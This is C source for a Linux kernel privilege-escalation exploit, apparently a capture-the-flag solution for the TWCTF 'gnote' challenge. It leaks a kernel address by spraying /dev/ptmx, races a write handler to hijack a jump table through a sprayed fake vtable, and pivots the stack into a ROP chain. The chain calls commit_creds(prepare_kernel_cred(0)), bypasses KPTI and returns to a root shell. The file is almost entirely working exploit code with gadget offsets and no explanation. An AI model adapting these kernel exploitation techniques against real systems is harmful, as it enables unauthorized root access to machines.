/*cc -O3 -pthread -static ex.c */
#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <syscall.h>
#include <pty.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/user.h>

/* TWCTF{Ga_ryo_is_master_of_note_creator}*/

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
#define MENU_ADD    1 
#define MENU_SELECT 5

int istriggered = 0;
struct data race;

struct trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    uint64_t  rsp;
    uint64_t  ss;
} __attribute__ (( packed )) tf; // Trap frame used for iretq when returning back to userland


void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}


struct data 
{
    unsigned int menu; 
    unsigned int arg;
    unsigned int a;
};

int add_note(int fd, unsigned int size)
{
    struct data d;
    d.menu = MENU_ADD;
    d.arg = size;
    write(fd, (void *)&d, sizeof(struct data));
}

int select_note(int fd, unsigned int idx)
{
    struct data d;
    d.menu = MENU_SELECT;
    d.arg = idx;
    write(fd, (void *)&d, sizeof(struct data));
}

void racerace(void *s)
{
    struct data *data = s;
    while(!istriggered){
        data->menu = 0x8000000 + 0x200000; // jmptable -> rax: vtable
        // usleep(000 * 1000);
        printf("racerace\n");
    }
}
void writes(const char *buf) {
  while (*buf) {
    write(1, buf, 1);
    buf++;
  }
}

const char *hex = "0123456789abcdef";
void lhex(uint64_t num) {
  char buf[17];
  writes("0x");
  for (int i = 0; i < 16; i++) {
    buf[15-i] = hex[num & 0xf];
    num >>= 4;
  }
  buf[16] = 0;
  write(1, buf, sizeof(buf));
  writeln("");
}

const char nl = '\n';
void writeln(const char *buf) {
  writes(buf);
  write(1, &nl, 1);
}
void shell(void) {
    istriggered = 1;
    system("/bin/sh");
}

void prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.rsp -= 1024; // unused part of  stack
    tf.rsp  &= -0x10; // Align to avoid sse crash
    // Since we return directly to shell there isn't return address pushed to stack.
    // so we need to simulate that push to maintain alignment
    tf.rsp  -= 8;
}

#define LEAK_LEN 0x8000
int main(int argc, char *argv[])
{
    prepare_tf();
    pthread_t pthread;
    int fd, fd2;
    int status;
    char buf[LEAK_LEN] = {0};
    struct data race;

    fd = open("/proc/gnote",O_RDWR);    
    if ( fd < 0 )
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
#define ALLOC_NUM (50)
    int m_fd[ALLOC_NUM] = {0};
    for (int i = 0; i < ALLOC_NUM; i++)
        m_fd[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    for (int i = 0; i < ALLOC_NUM; i++)
        close(m_fd[i]);

    add_note(fd, 512);
    select_note(fd, 0);
    read(fd, buf, 512);
    DumpHex(buf, 512);
    void * leak = (*(void**)(buf+0x20));
    writes("[+] leak : "); lhex((long)leak);
    char * text_base = ((char*)leak) - 0x2b2fd0;    
    writes("[+] kernel text @ "); lhex((long)text_base);
    
    unsigned int rip = 0xdeadbeef;
    add_note(fd, rip);
        
    pthread_create(&pthread, NULL, racerace, &race);
    void *map = mmap((void*)0x1000000, 0x1000000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);    
    writes("[+] vtable @ "); lhex((long)map);
    if (map != 0x1000000 )
    {
        perror("mmap");
        exit(0);
    }

    unsigned long xchg_eax_esp = (long)text_base + 0x1992a;
    unsigned long mov_cr4rdi_rbp_ret = (long)text_base + 0x3ef24;
    unsigned long pop_rdi_ret  = (long)text_base + 0x1c20d;
    commit_creds = (_commit_creds)text_base + 0x69df0;
    prepare_kernel_cred = (_prepare_kernel_cred)text_base + (0xffffffffaf869fe0 - 0xffffffffaf800000);
    unsigned long pop_rsi_ret = (long)text_base + 0x37799;
    unsigned long mov_rdi_rax_pop_rbp_ret  = (long)text_base + 0x21ca6a;
    unsigned long swapgs_ret = (long)text_base + 0x3efc4;
    unsigned long kpti_ret = (long)text_base + 0x600A4A;
    unsigned long ireq = (long)text_base + 0x1dd06;

    size_t pivot_stack_addr = (size_t)(xchg_eax_esp) & 0xffffffff; // Target rsp
    size_t mmap_target = pivot_stack_addr & PAGE_MASK; // Align to page boundary
    char* mmapped = mmap(mmap_target, 0x100000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    
    char* temp_stack = mmap(0x30000000, 0x100000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    
    writes("[+] mmapped @ "); lhex((long)mmapped);
    if (mmapped != mmap_target || pivot_stack_addr != mmapped + (pivot_stack_addr & ~PAGE_MASK))
    {
        perror("mmap");
        exit(0);
    }


    /*
    0xffffffff8101992a : xchg eax, esp, ret;
    0xffffffff8101c20d : pop rdi ; ret;
    0xffffffff8121ca6a : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff8121ca66 ; pop rbp ; ret <- really important 
    0xffffffff8121cacc : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff8121cac6 ; pop rbp ; ret
    */

    /* Feng shui vtable */
    uintptr_t* vtable = (void *)map;
    for (int i=0; i<(0x1000000/8); i++)
    {
        vtable[i] = xchg_eax_esp;
    }

    int idx = 0;
    uintptr_t* ropchain = (void**) pivot_stack_addr;
    // commit_creds(prepare_kernel_cred(0))
    ropchain[idx++] = pop_rdi_ret;
    ropchain[idx++] = 0;
    ropchain[idx++] = prepare_kernel_cred;
    ropchain[idx++] = pop_rsi_ret;
    ropchain[idx++] = -1;
    ropchain[idx++] = mov_rdi_rax_pop_rbp_ret;
    ropchain[idx++] = 0x6969696969696969; // popped rbp
    ropchain[idx++] = commit_creds; 
    // bypass kpti
    ropchain[idx++] = kpti_ret; 
    ropchain[idx++] = 0x6969696969696969; 
    ropchain[idx++] = 0x6969696969696969; 
    memcpy(&ropchain[idx], &tf,sizeof(tf));

    for (int i=0; i<0x4000000000; i++)
    {
        race.menu = MENU_ADD;
        race.arg = 0xbeefdead;
        race.a = 0xffffffff;
        write(fd, (void *)&race, sizeof(struct data));    
    }

    pthread_join(pthread, NULL);
    return 0;
}